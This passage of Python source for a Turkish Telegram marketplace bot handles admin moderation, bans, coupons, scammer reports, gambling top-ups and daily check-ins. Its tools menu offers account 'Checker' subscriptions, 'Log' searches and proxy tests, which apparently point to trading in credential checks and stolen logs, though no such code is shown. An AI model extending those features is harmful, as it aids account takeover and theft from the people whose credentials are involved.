      bot.send_message(chat_id, f"📦 **{market_data.get(item_key, {}).get('name', item_key)}** stok ekle\n\n• Satır satır yaz **veya**\n• 📎 `.txt` / `.csv` dosyası gönder\n/iptal", parse_mode="Markdown")
    else:
      if item_key in market_data and "stock_file" in market_data[item_key]:
        with open(market_data[item_key]["stock_file"], "w", encoding="utf-8") as f:
          f.write("")
        bot.send_message(chat_id, "✅ Stok sıfırlandı.")

  elif call.data == "admin_add_gamble_bal":
    if user_id not in admin_ids_set:
      safe_answer("Yetki yok", show_alert=True)
      return
    safe_answer()
    user_states[chat_id] = "waiting_add_gamble_id"
    bot.send_message(chat_id, "🎲 Kumar bakiyesi eklenecek kullanıcının **Telegram ID** yazın:", parse_mode="Markdown")
    return

  elif call.data == "admin_list_bans":
    if user_id not in admin_ids_set:
      safe_answer("Yetki yok", show_alert=True)
      return
    safe_answer()
    lines = ["🚫 **Ban Listesi**", ""]
    if banned_users:
      lines.append(f"**Kalıcı ({len(banned_users)}):**")
      for bid in sorted(banned_users)[:80]:
        hard = " 🔒SÜPER" if bid in hard_banned_users else ""
        lines.append(f"• `{bid}`{hard}")
      if len(banned_users) > 80:
        lines.append(f"... +{len(banned_users)-80} daha")
    else:
      lines.append("Kalıcı ban yok.")
    if hard_banned_users:
      lines.append("")
      lines.append(f"**Süper ban ({len(hard_banned_users)}):**")
      for bid in sorted(hard_banned_users)[:40]:
        lines.append(f"• `{bid}`")
    now = time.time()
    active_temp = {k: v for k, v in temp_banned_users.items() if v > now}
    if active_temp:
      lines.append("")
      lines.append(f"**Geçici ({len(active_temp)}):**")
      for bid, exp in list(sorted(active_temp.items()))[:40]:
        left = int(exp - now)
        lines.append(f"• `{bid}` — {left//60} dk kaldı")
    if not banned_users and not hard_banned_users and not active_temp:
      lines.append("")
      lines.append("✅ Hiç banlı kullanıcı yok.")
    text = "\n".join(lines)
    try:
      bot.send_message(chat_id, text, parse_mode="Markdown")
    except Exception:
      bot.send_message(chat_id, text.replace("`", "").replace("**", ""))
    return

  elif call.data in ["admin_ban", "admin_unban", "admin_delete_balance", "admin_warn_user", "admin_create_coupon", "admin_broadcast", "admin_add_balance"]:
    if user_id not in admin_ids_set: return
    safe_answer()
    s_map = {
      "admin_ban": ("waiting_admin_ban_id", "🚫 Kalıcı Banlanacak ID:"),
      "admin_unban": ("waiting_admin_unban_id", "✅ Banı açılacak ID:"),
      "admin_delete_balance": ("waiting_admin_del_bal_id", "🗑️ Bakiyesi silinecek ID:"),
      "admin_warn_user": ("waiting_admin_warn_id", "⚠️ Uyarılacak ID:"),
      "admin_create_coupon": ("waiting_admin_coupon_code", "🎟️ Yeni kupon kodunu yazın (örnek: BONUS50):\n• Harf/rakam kullanın\n• Büyük-küçük harf fark etmez"),
      "admin_broadcast": ("waiting_broadcast", "📢 Duyuru metni:"),
      "admin_add_balance": ("waiting_add_balance_id", "💰 Bakiye eklenecek ID:")
    }
    user_states[chat_id] = s_map[call.data][0]
    bot.send_message(chat_id, s_map[call.data][1], parse_mode="Markdown")

  elif call.data == "admin_list_coupons":
    if user_id not in admin_ids_set:
      safe_answer("❌ Yetkiniz yok!", show_alert=True)
      return
    safe_answer()
    if not coupons:
      text = "📭 Aktif kupon yok."
    else:
      text = f"📋 **Aktif Kuponlar** ({len(coupons)} adet)\n\n"
      for code, val in list(coupons.items())[:50]:
        if isinstance(val, dict):
          left = val.get("max_uses", 1) - val.get("used_count", 0)
          exp = val.get("expires_at") or "süresiz"
          text += f"🎟️ `{code}` → **{float(val.get('value',0)):.2f} TL** | kalan:{left} | son:{exp}\n"
        else:
          text += f"🎟️ `{code}` → **{float(val):.2f} TL**\n"
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
      types.InlineKeyboardButton("🎟️ Yeni Kupon Oluştur", callback_data="admin_create_coupon"),
      types.InlineKeyboardButton("🔙 Admin Panel", callback_data="menu_admin")
    )
    try:
      bot.edit_message_text(text, chat_id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
    except:
      bot.send_message(chat_id, text, reply_markup=markup, parse_mode="Markdown")
    return

  elif call.data == "admin_stats":
    if user_id not in admin_ids_set: return
    safe_answer()
    stats_msg = (
      f"📊 **SİSTEM VE HESAP İSTATİSTİKLERİ**\n\n"
      f"👥 **Hesap Açmış Kullanıcı Sayısı:** `{len(user_credentials)}` Kişi\n"
      f"🆔 **Toplam Kayıtlı Telegram ID:** `{len(registered_users)}`\n"
      f"📢 **Aktif İlan Sayısı:** `{len(listings)}` Adet\n"
      f"🚫 **Banlı Kullanıcı Sayısı:** `{len(banned_users)}` Kişi\n"
      f"⏳ **Süreli Banlı Sayısı:** `{len(temp_banned_users)}` Kişi\n"
    )
    markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 Admin Paneline Dön", callback_data="menu_admin"))
    try:
      bot.edit_message_text(stats_msg, chat_id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
    except:
      bot.send_message(chat_id, stats_msg, reply_markup=markup, parse_mode="Markdown")

  elif call.data == "admin_manage_listings":
    if user_id not in admin_ids_set:
      safe_answer("❌ Yetkiniz yok!", show_alert=True)
      return
    safe_answer()
    if not listings:
      markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 Admin Paneline Dön", callback_data="menu_admin"))
      try:
        bot.edit_message_text("📭 Sistemde aktif ilan bulunmuyor.", chat_id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
      except:
        bot.send_message(chat_id, "📭 Sistemde aktif ilan bulunmuyor.", reply_markup=markup, parse_mode="Markdown")
      return

    markup = types.InlineKeyboardMarkup(row_width=1)
    text = f"📢 **İLAN YÖNETİMİ**\nToplam Aktif İlan: **{len(listings)}**\n\nSilmek veya detay görmek için ilanı seçin:\n"
    for l_id, item in list(listings.items())[:40]:
      title_short = (item.get('title') or 'Başlıksız')[:25]
      price_val = item.get('price', 0)
      stock_val = item.get('stock', 1)
      btn_label = f"🗑️ {l_id} | {title_short} | {price_val} TL | Stok:{stock_val}"
      markup.add(types.InlineKeyboardButton(btn_label, callback_data=f"admin_listing_detail_{l_id}"))
    markup.add(types.InlineKeyboardButton("🔙 Admin Paneline Dön", callback_data="menu_admin"))
    try:
      bot.edit_message_text(text, chat_id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
    except:
      bot.send_message(chat_id, text, reply_markup=markup, parse_mode="Markdown")
    return

  elif call.data.startswith("admin_listing_detail_"):
    if user_id not in admin_ids_set:
      safe_answer("❌ Yetkiniz yok!", show_alert=True)
      return
    safe_answer()
    l_id = call.data.split("_")[3]
    if l_id not in listings:
      safe_answer("❌ Bu ilan artık mevcut değil!", show_alert=True)
      return
    item = listings[l_id]
    owner_str = f"@{item.get('owner_username')}" if item.get('owner_username') else f"`{item.get('user_id')}`"
    detail_text = (
      f"📋 **İLAN DETAYI (Admin Kontrol)**\n\n"
      f"🆔 İlan ID: `{l_id}`\n"
      f"👤 Satıcı: {owner_str}\n"
      f"🏷️ Başlık: **{item.get('title', 'Yok')}**\n"
      f"💵 Fiyat: **{item.get('price', 0)} TL**\n"
      f"📦 Stok: **{item.get('stock', 1)}**\n"
      f""
      f"📄 Açıklama: {item.get('desc', 'Yok')}\n"
    )
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
      types.InlineKeyboardButton("🗑️ Bu İlanı Sil", callback_data=f"admin_del_listing_{l_id}"),
      types.InlineKeyboardButton("📦 Stoğu 0 Yap (Kaldır)", callback_data=f"admin_zero_stock_{l_id}"),
      types.InlineKeyboardButton("🔙 İlan Listesine Dön", callback_data="admin_manage_listings"),
      types.InlineKeyboardButton("🔙 Admin Paneline Dön", callback_data="menu_admin")
    )
    try:
      if item.get('photo'):
        bot.send_photo(chat_id, item['photo'], caption=detail_text, reply_markup=markup, parse_mode="Markdown")
      else:
        bot.edit_message_text(detail_text, chat_id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
    except:
      bot.send_message(chat_id, detail_text, reply_markup=markup, parse_mode="Markdown")
    return

  elif call.data.startswith("admin_del_listing_"):
    if user_id not in admin_ids_set:
      safe_answer("❌ Yetkiniz yok!", show_alert=True)
      return
    l_id = call.data.split("_")[3]
    if l_id not in listings:
      safe_answer("❌ İlan bulunamadı veya zaten silinmiş!", show_alert=True)
      return
    item = listings[l_id]
    owner_id = item.get('user_id')
    title = item.get('title', 'İlan')
    del listings[l_id]
    to_remove = [pid for pid, req in pending_listing_orders.items() if req.get('listing_id') == l_id]
    for pid in to_remove:
      del pending_listing_orders[pid]
    save_data()
    safe_answer("✅ İlan başarıyla silindi!", show_alert=True)
    try:
      bot.edit_message_text(f"🗑️ **İlan Silindi**\n\n🆔 `{l_id}`\n🏷️ {title}\n\n✅ Sistemden kalıcı olarak kaldırıldı.", chat_id, call.message.message_id, parse_mode="Markdown")
    except:
      try:
        bot.edit_message_caption(chat_id=chat_id, message_id=call.message.message_id, caption=f"🗑️ **İlan Silindi**\n\n🆔 `{l_id}`\n🏷️ {title}", parse_mode="Markdown")
      except:
        bot.send_message(chat_id, f"🗑️ İlan `{l_id}` silindi.")
    if owner_id:
      try:
        bot.send_message(owner_id, f"⚠️ **Yönetici Bildirimi**\n\n'{title}' başlıklı ilanınız yöneticiler tarafından sistemden **silindi**.", parse_mode="Markdown")
      except:
        pass
    return

  elif call.data.startswith("admin_zero_stock_"):
    if user_id not in admin_ids_set:
      safe_answer("❌ Yetkiniz yok!", show_alert=True)
      return
    l_id = call.data.split("_")[3]
    if l_id not in listings:
      safe_answer("❌ İlan bulunamadı!", show_alert=True)
      return
    item = listings[l_id]
    title = item.get('title', 'İlan')
    owner_id = item.get('user_id')
    del listings[l_id]
    to_remove = [pid for pid, req in pending_listing_orders.items() if req.get('listing_id') == l_id]
    for pid in to_remove:
      del pending_listing_orders[pid]
    save_data()
    safe_answer("✅ İlan stok 0 yapılarak kaldırıldı!", show_alert=True)
    try:
      bot.edit_message_text(f"📦 **Stok Sıfırlandı / İlan Kaldırıldı**\n\n🆔 `{l_id}`\n🏷️ {title}", chat_id, call.message.message_id, parse_mode="Markdown")
    except:
      try:
        bot.edit_message_caption(chat_id=chat_id, message_id=call.message.message_id, caption=f"📦 İlan `{l_id}` kaldırıldı.", parse_mode="Markdown")
      except:
        pass
    if owner_id:
      try:
        bot.send_message(owner_id, f"⚠️ **Yönetici Bildirimi**\n\n'{title}' başlıklı ilanınızın stoğu yönetici tarafından sıfırlandı ve ilan yayından kaldırıldı.", parse_mode="Markdown")
      except:
        pass
    return

  elif call.data == "menu_bug_report":
    safe_answer()
    user_states[chat_id] = "waiting_bug_report"
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("❌ İptal", callback_data="main_menu"))
    bot.send_message(
      chat_id,
      f"🐛 **HATA BİLDİR**\n\n"
      f"Botta gördüğün hatayı / eksiği yaz (istersen ekran görüntüsü de gönder).\n\n"
      f"✅ Admin **doğru / faydalı** bulursa **+{BUG_REPORT_REWARD:.0f} TL** ödül.\n"
      f"❌ Yanlış / spam bildirim ödül almaz.\n\n"
      f"📝 Hatayı detaylı yaz:",
      reply_markup=markup,
      parse_mode="Markdown",
    )
    return

  elif call.data == "admin_pending_bugs":
    if user_id not in admin_ids_set:
      safe_answer("❌ Yetkiniz yok!", show_alert=True)
      return
    safe_answer()
    if not pending_bug_reports:
      bot.send_message(chat_id, "📭 Bekleyen hata bildirimi yok.")
      return
    for rid, rep in list(pending_bug_reports.items())[:25]:
      text = (
        f"🐛 **HATA BİLDİRİMİ** `{rid}`\n\n"
        f"👤 Bildiren: `{rep.get('reporter')}`\n"
        f"📅 `{rep.get('time', '-')}`\n\n"
        f"📝 {rep.get('text', '-')[:3500]}"
      )
      markup = types.InlineKeyboardMarkup(row_width=2)
      markup.add(
        types.InlineKeyboardButton(f"✅ Onayla (+{BUG_REPORT_REWARD:.0f} TL)", callback_data=f"bug_approve_{rid}"),
        types.InlineKeyboardButton("❌ Reddet", callback_data=f"bug_reject_{rid}"),
      )
      if rep.get("photo"):
        try:
          bot.send_photo(chat_id, rep["photo"], caption=text, reply_markup=markup, parse_mode="Markdown")
        except Exception:
          bot.send_message(chat_id, text, reply_markup=markup, parse_mode="Markdown")
      else:
        bot.send_message(chat_id, text, reply_markup=markup, parse_mode="Markdown")
    return

  elif call.data.startswith("bug_approve_"):
    if user_id not in admin_ids_set:
      safe_answer("❌ Yetkiniz yok!", show_alert=True)
      return
    rid = call.data.replace("bug_approve_", "", 1)
    rep = pending_bug_reports.pop(rid, None)
    if not rep:
      safe_answer("Rapor yok / işlendi.", show_alert=True)
      return
    reporter = int(rep.get("reporter", 0))
    rep["status"] = "approved"
    rep["reward"] = BUG_REPORT_REWARD
    bug_reports[rid] = rep
    if reporter:
      ensure_user(reporter)
      user_balances[reporter] = user_balances.get(reporter, 0.0) + BUG_REPORT_REWARD
      add_balance_history(reporter, "bug_reward", BUG_REPORT_REWARD, f"Hata bildirimi {rid}")
      add_notification(reporter, f"+{BUG_REPORT_REWARD:.0f} TL hata bildirimi ödülü 🐛")
      try:
        bot.send_message(
          reporter,
          f"🎉 **Hata bildirimin onaylandı!**\n\n"
          f"+**{BUG_REPORT_REWARD:.0f} TL** bakiyene eklendi.\n"
          f"💳 Bakiye: **{user_balances[reporter]:.2f} TL**\n"
          f"🆔 Rapor: `{rid}`",
          parse_mode="Markdown",
        )
      except Exception:
        pass
    save_data()
    log_activity("bug_approve", user_id, f"{rid} -> {reporter} +{BUG_REPORT_REWARD}")
    safe_answer("Onaylandı, ödül yollandı!", show_alert=True)
    try:
      bot.edit_message_reply_markup(chat_id, call.message.message_id, reply_markup=None)
    except Exception:
      pass
    bot.send_message(chat_id, f"✅ `{rid}` onaylandı → `{reporter}` +{BUG_REPORT_REWARD:.0f} TL", parse_mode="Markdown")
    return

  elif call.data.startswith("bug_reject_"):
    if user_id not in admin_ids_set:
      safe_answer("❌ Yetkiniz yok!", show_alert=True)
      return
    rid = call.data.replace("bug_reject_", "", 1)
    rep = pending_bug_reports.pop(rid, None)
    if not rep:
      safe_answer("Rapor yok / işlendi.", show_alert=True)
      return
    reporter = int(rep.get("reporter", 0))
    rep["status"] = "rejected"
    bug_reports[rid] = rep
    save_data()
    log_activity("bug_reject", user_id, rid)
    if reporter:
      try:
        bot.send_message(
          reporter,
          f"❌ Hata bildirimin reddedildi.\n🆔 `{rid}`\nÖdül yok.",
          parse_mode="Markdown",
        )
      except Exception:
        pass
    safe_answer("Reddedildi.", show_alert=True)
    try:
      bot.edit_message_reply_markup(chat_id, call.message.message_id, reply_markup=None)
    except Exception:
      pass
    bot.send_message(chat_id, f"❌ `{rid}` reddedildi.", parse_mode="Markdown")
    return

  elif call.data == "menu_scammers":
    safe_answer()
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
      types.InlineKeyboardButton("📋 Dolandırıcı Listesini Gör", callback_data="scammer_list"),
      types.InlineKeyboardButton("⚠️ Dolandırıcı Bildir", callback_data="scammer_report"),
      types.InlineKeyboardButton(t(user_id, "btn_back_main"), callback_data="main_menu")
    )
    text = (
      "🚨 **DOLANDIRICILAR LİSTESİ**\n\n"
      "Bu bölümde onaylanmış dolandırıcı bildirimlerini görebilirsiniz.\n"
      "Alışveriş yapmadan önce kontrol edin!\n\n"
      "⚠️ Yalan bildirim yapmak ban sebebidir."
    )
    try:
      bot.edit_message_text(text, chat_id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
    except:
      bot.send_message(chat_id, text, reply_markup=markup, parse_mode="Markdown")
    return

  elif call.data == "scammer_list":
    safe_answer()
    approved = {k: v for k, v in scammer_reports.items() if v.get("approved")}
    if not approved:
      bot.send_message(chat_id, "📭 Onaylanmış dolandırıcı kaydı yok.")
      return
    for rid, rep in list(approved.items())[:30]:
      defense = rep.get("defense")
      text = (
        f"🚨 **DOLANDIRICI BİLDİRİMİ**\n\n"
        f"🆔 Rapor ID: `{rid}`\n"
        f"👤 Şikayet edilen: **{rep.get('accused', '?')}**\n"
        f"📝 Şikayet: {rep.get('desc', '-')}\n"
        f"📅 Tarih: `{rep.get('time', '-')}`\n"
      )
      if defense:
        text += f"\n🛡️ **Savunma:** {defense}\n"
      text += "\n⚠️ Dikkatli olun!"
      markup = types.InlineKeyboardMarkup(row_width=1)
      markup.add(types.InlineKeyboardButton("🛡️ Savunma / Açıklama Yaz", callback_data=f"scammer_defend_{rid}"))
      if user_id in admin_ids_set:
        markup.add(types.InlineKeyboardButton("🗑️ Raporu Sil (Admin)", callback_data=f"scammer_delete_{rid}"))
      if rep.get("photo"):
        try:
          bot.send_photo(chat_id, rep["photo"], caption=text, reply_markup=markup, parse_mode="Markdown")
        except:
          bot.send_message(chat_id, text, reply_markup=markup, parse_mode="Markdown")
      else:
        bot.send_message(chat_id, text, reply_markup=markup, parse_mode="Markdown")
    markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 Geri", callback_data="menu_scammers"))
    bot.send_message(chat_id, f"Toplam **{len(approved)}** kayıt gösterildi.", reply_markup=markup, parse_mode="Markdown")
    return

  elif call.data == "scammer_report":
    safe_answer()
    user_states[chat_id] = "waiting_scammer_accused"
    admin_temp_data[chat_id] = {"scammer_report": {}}
    markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("❌ İptal", callback_data="menu_scammers"))
    bot.send_message(chat_id, "⚠️ **DOLANDIRICI BİLDİR**\n\n👤 Dolandırıcının **Telegram ID / kullanıcı adı / isim** bilgisini yazın:", reply_markup=markup, parse_mode="Markdown")
    return

  elif call.data == "admin_pending_scammers":
    if user_id not in admin_ids_set:
      safe_answer("❌ Yetkiniz yok!", show_alert=True)
      return
    safe_answer()
    if not pending_scammer_reports:
      bot.send_message(chat_id, "📭 Bekleyen dolandırıcı raporu yok.")
      return
    for rid, rep in list(pending_scammer_reports.items())[:20]:
      text = (
        f"🚨 **BEKLEYEN RAPOR** `{rid}`\n\n"
        f"👤 Şikayet edilen: **{rep.get('accused', '?')}**\n"
        f"🕵️ Bildiren: `{rep.get('reporter_id')}`\n"
        f"📝 Açıklama: {rep.get('desc', '-')}\n"
        f"📅 {rep.get('time', '-')}"
      )
      markup = types.InlineKeyboardMarkup(row_width=2)
      markup.add(
        types.InlineKeyboardButton("✅ Onayla", callback_data=f"scammer_approve_{rid}"),
        types.InlineKeyboardButton("❌ Reddet", callback_data=f"scammer_reject_{rid}")
      )
      if rep.get("photo"):
        try:
          bot.send_photo(chat_id, rep["photo"], caption=text, reply_markup=markup, parse_mode="Markdown")
        except:
          bot.send_message(chat_id, text, reply_markup=markup, parse_mode="Markdown")
      else:
        bot.send_message(chat_id, text, reply_markup=markup, parse_mode="Markdown")
    return

  elif call.data.startswith("scammer_approve_"):
    if user_id not in admin_ids_set:
      safe_answer("❌ Yetkiniz yok!", show_alert=True)
      return
    rid = call.data.split("_")[2]
    if rid not in pending_scammer_reports:
      safe_answer("Rapor bulunamadı!", show_alert=True)
      return
    rep = pending_scammer_reports.pop(rid)
    rep["approved"] = True
    scammer_reports[rid] = rep
    save_data()
    log_activity("scammer_approve", user_id, rid)
    safe_answer("✅ Onaylandı ve yayınlandı!", show_alert=True)
    try:
      bot.edit_message_caption(chat_id=chat_id, message_id=call.message.message_id, caption=(call.message.caption or "") + "\n\n**✅ ONAYLANDI**", parse_mode="Markdown")
    except:
      try:
        bot.edit_message_text((call.message.text or "") + "\n\n**✅ ONAYLANDI**", chat_id, call.message.message_id, parse_mode="Markdown")
      except:
        pass
    try:
      bot.send_message(rep.get("reporter_id"), f"✅ Dolandırıcı bildiriminiz onaylandı!\nŞikayet edilen: **{rep.get('accused')}**", parse_mode="Markdown")
    except:
      pass
    return

  elif call.data.startswith("scammer_reject_"):
    if user_id not in admin_ids_set:
      safe_answer("❌ Yetkiniz yok!", show_alert=True)
      return
    rid = call.data.split("_")[2]
    if rid not in pending_scammer_reports:
      safe_answer("Rapor bulunamadı!", show_alert=True)
      return
    rep = pending_scammer_reports.pop(rid)
    save_data()
    log_activity("scammer_reject", user_id, rid)
    safe_answer("❌ Reddedildi!", show_alert=True)
    try:
      bot.edit_message_text((call.message.text or call.message.caption or "") + "\n\n**❌ REDDEDİLDİ**", chat_id, call.message.message_id, parse_mode="Markdown")
    except:
      pass
    try:
      bot.send_message(rep.get("reporter_id"), f"❌ Dolandırıcı bildiriminiz reddedildi.\nŞikayet edilen: {rep.get('accused')}")
    except:
      pass
    return

  elif call.data.startswith("scammer_defend_"):
    rid = call.data.split("_")[2]
    if rid not in scammer_reports or not scammer_reports[rid].get("approved"):
      safe_answer("Rapor bulunamadı!", show_alert=True)
      return
    safe_answer()
    user_states[chat_id] = "waiting_scammer_defense"
    admin_temp_data[chat_id] = {"defend_rid": rid}
    bot.send_message(chat_id, f"🛡️ **Savunma / Açıklama**\n\nRapor `{rid}` için açıklamanızı yazın.\nÖrn: *İlan sahtedir, dolandırmadım, kanıtım var...*", parse_mode="Markdown")
    return

  elif call.data.startswith("scammer_delete_"):
    if user_id not in admin_ids_set:
      safe_answer("❌ Yetkiniz yok!", show_alert=True)
      return
    rid = call.data.split("_")[2]
    if rid in scammer_reports:
      del scammer_reports[rid]
      save_data()
      log_activity("scammer_delete", user_id, rid)
      safe_answer("✅ Rapor silindi!", show_alert=True)
      try:
        bot.edit_message_caption(chat_id=chat_id, message_id=call.message.message_id, caption="🗑️ **Bu rapor admin tarafından silindi.**", parse_mode="Markdown")
      except:
        try:
          bot.edit_message_text("🗑️ **Bu rapor admin tarafından silindi.**", chat_id, call.message.message_id, parse_mode="Markdown")
        except:
          bot.send_message(chat_id, f"🗑️ Rapor `{rid}` silindi.", parse_mode="Markdown")
    else:
      safe_answer("Rapor zaten yok!", show_alert=True)
    return

  elif call.data == "hub_account":
    safe_answer()
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
      types.InlineKeyboardButton("👤 Hesabım", callback_data="menu_account"),
      types.InlineKeyboardButton("💳 Bakiye", callback_data="menu_bakiye"),
    )
    markup.add(
      types.InlineKeyboardButton("⭐ Bakiye Yükle", callback_data="star_topup_menu"),
      types.InlineKeyboardButton("🎲 Kumar Yükle", callback_data="star_gamble_topup_menu"),
    )
    markup.add(
      types.InlineKeyboardButton("🌳 Ref Ağacı", callback_data="menu_ref_tree"),
      types.InlineKeyboardButton("👥 Referans", callback_data="menu_referans"),
    )
    qon = "🔇 Sessiz AÇIK" if is_quiet_mode(user_id) else "🔔 Sessiz KAPALI"
    markup.add(types.InlineKeyboardButton(qon, callback_data="toggle_quiet_mode"))
    markup.add(types.InlineKeyboardButton("⭐ Bota Puan", callback_data="rate_bot_menu"))
    markup.add(types.InlineKeyboardButton("🐛 Hata Bildir", callback_data="menu_bug_report"))
    markup.add(types.InlineKeyboardButton("🔙 Ana Menü", callback_data="main_menu"))
    try:
      bot.edit_message_text("👤 **Hesap / Bakiye**\n\nNe yapmak istersin?", chat_id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
    except Exception:
      bot.send_message(chat_id, "👤 **Hesap / Bakiye**", reply_markup=markup, parse_mode="Markdown")
    return

  elif call.data == "hub_shop":
    safe_answer()
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(types.InlineKeyboardButton("📢 İlanlar / Pazar", callback_data="menu_ilanlar"))
    markup.add(types.InlineKeyboardButton("🛒 Market", callback_data="menu_market"))
    markup.add(types.InlineKeyboardButton("⭐ VIP Market", callback_data="menu_vip_market"))
    markup.add(types.InlineKeyboardButton("🚨 Dolandırıcı Listesi", callback_data="menu_scammers"))
    markup.add(types.InlineKeyboardButton("🔙 Ana Menü", callback_data="main_menu"))
    try:
      bot.edit_message_text("🛒 **Alışveriş**\n\nİlan, market veya VIP:", chat_id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
    except Exception:
      bot.send_message(chat_id, "🛒 **Alışveriş**", reply_markup=markup, parse_mode="Markdown")
    return

  elif call.data == "hub_tools":
    safe_answer()
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(types.InlineKeyboardButton("💎 Checker Abonelik", callback_data="chk_sub_menu"))
    markup.add(
      types.InlineKeyboardButton("🎮 Checker", callback_data="menu_checker"),
      types.InlineKeyboardButton("📧 Geçici Mail", callback_data="menu_tempmail"),
    )
    markup.add(
      types.InlineKeyboardButton("📋 Log", callback_data="menu_log"),
      types.InlineKeyboardButton("🤖 Bot Token", callback_data="menu_my_bot"),
    )
    markup.add(
      types.InlineKeyboardButton("⚙️ Kişisel Araçlar", callback_data="menu_personal"),
      types.InlineKeyboardButton("🔗 Proxy Test", callback_data="tool_proxy_test"),
    )
    markup.add(types.InlineKeyboardButton("🔙 Ana Menü", callback_data="main_menu"))
    try:
      bot.edit_message_text("🎮 **Checker / Araçlar**\n\nAraç seç:", chat_id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
    except Exception:
      bot.send_message(chat_id, "🎮 **Checker / Araçlar**", reply_markup=markup, parse_mode="Markdown")
    return

  elif call.data == "hub_play":
    safe_answer()
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
      types.InlineKeyboardButton("🎰 Kumar", callback_data="menu_gambling"),
      types.InlineKeyboardButton("💰 Para Kazan", callback_data="menu_para_kazan"),
    )
    markup.add(
      types.InlineKeyboardButton("🏆 Turnuva", callback_data="menu_tournament"),
      types.InlineKeyboardButton("🗓️ Sezon", callback_data="menu_season"),
    )
    markup.add(
      types.InlineKeyboardButton("🎯 Aktiflik", callback_data="menu_engagement"),
      types.InlineKeyboardButton("🏆 Haftalık Sıra", callback_data="menu_weekly_lb"),
    )
    markup.add(types.InlineKeyboardButton("🔙 Ana Menü", callback_data="main_menu"))
    try:
      bot.edit_message_text("🎰 **Oyun / Kazanç**\n\nNe oynamak istersin?", chat_id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
    except Exception:
      bot.send_message(chat_id, "🎰 **Oyun / Kazanç**", reply_markup=markup, parse_mode="Markdown")
    return

  elif call.data == "hub_social":
    safe_answer()
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
      types.InlineKeyboardButton("💬 Canlı Sohbet", callback_data="menu_live_chat"),
      types.InlineKeyboardButton("🎭 Sosyal", callback_data="menu_sosyal"),
    )
    markup.add(
      types.InlineKeyboardButton("🌐 Sohbet V2", callback_data="menu_live_chat_v2"),
      types.InlineKeyboardButton("🤖 AI Sohbet", callback_data="tool_ai_chat"),
    )
    markup.add(
      types.InlineKeyboardButton("🔥 AI +18", callback_data="tool_ai_nsfw"),
      types.InlineKeyboardButton("⭐ Bota Puan", callback_data="rate_bot_menu"),
    )
    markup.add(types.InlineKeyboardButton("🔙 Ana Menü", callback_data="main_menu"))
    try:
      bot.edit_message_text("💬 **Sosyal**\n\nSohbet / AI / puan:", chat_id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
    except Exception:
      bot.send_message(chat_id, "💬 **Sosyal**", reply_markup=markup, parse_mode="Markdown")
    return

  elif call.data == "menu_engagement":

    safe_answer()
    try:
      touch_presence(user_id)
      bump_activity(user_id, 1)
    except Exception:
      pass
    markup = types.InlineKeyboardMarkup(row_width=1)
    if not has_checked_in_today(user_id):
      markup.add(types.InlineKeyboardButton("🔥 Bugün geldim (Check-in +TL)", callback_data="daily_checkin"))
    else:
      markup.add(types.InlineKeyboardButton("✅ Bugün check-in yapıldı", callback_data="daily_checkin"))
    markup.add(types.InlineKeyboardButton("🎁 Günlük Bonus Al", callback_data="claim_daily_bonus"))
    markup.add(types.InlineKeyboardButton("📋 Görev Ödülü Al", callback_data="claim_quest_reward"))
    markup.add(types.InlineKeyboardButton("🎟 Grup Kodu Gir", callback_data="claim_group_code"))
    markup.add(types.InlineKeyboardButton("🏆 Haftalık Sıra", callback_data="menu_weekly_lb"))
    markup.add(types.InlineKeyboardButton("🔙 Ana Menü", callback_data="main_menu"))
    bot.send_message(chat_id, engagement_hub_text(user_id), reply_markup=markup, parse_mode="Markdown")
    return

  elif call.data == "quest_card_info":
    safe_answer()
    claimed, cin, logok, rew = quest_card_status(user_id)
    msg = "Gunluk gorev\n\n1) Check-in\n2) En az 1 log ara\n3) Odul al (+%.0f TL)\n\nCheck-in: %s\nLog: %s" % (
      rew, "tamam" if cin else "eksik", "tamam" if logok else "eksik")
    msg = msg.replace("\\n", "\n")
    markup = types.InlineKeyboardMarkup(row_width=1)
    if not cin:
      markup.add(types.InlineKeyboardButton("Check-in", callback_data="daily_checkin"))
    markup.add(types.InlineKeyboardButton("Log", callback_data="menu_log"))
    if cin and logok and not claimed:
      markup.add(types.InlineKeyboardButton("Odul al", callback_data="quest_card_claim"))
    markup.add(types.InlineKeyboardButton("Ana Menu", callback_data="main_menu"))
    try:
      bot.send_message(chat_id, msg, reply_markup=markup)
    except Exception:
      pass
    return

  elif call.data == "quest_card_claim":
    safe_answer()
    ok, msg = claim_quest_card(user_id)
    try:
      bot.send_message(chat_id, msg)
    except Exception:
      pass
    return

  elif call.data == "daily_checkin":
    safe_answer()
    try:
      touch_presence(user_id)
    except Exception:
      pass
    ok, msg, reward, streak = claim_daily_checkin(user_id)
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(types.InlineKeyboardButton("🏆 Haftalık Sıra", callback_data="menu_weekly_lb"))
    markup.add(types.InlineKeyboardButton("🎯 Aktiflik", callback_data="menu_engagement"))
    markup.add(types.InlineKeyboardButton("🔙 Ana Menü", callback_data="main_menu"))
    try:
      bot.answer_callback_query(
        call.id,
        f"+{int(reward)} TL · seri {streak}" if ok else "Zaten yaptın",
        show_alert=not ok,
      )
    except Exception:
      pass
    try:
      bot.send_message(chat_id, msg + "\n\n" + engagement_hub_text(user_id), reply_markup=markup, parse_mode="Markdown")
    except Exception:
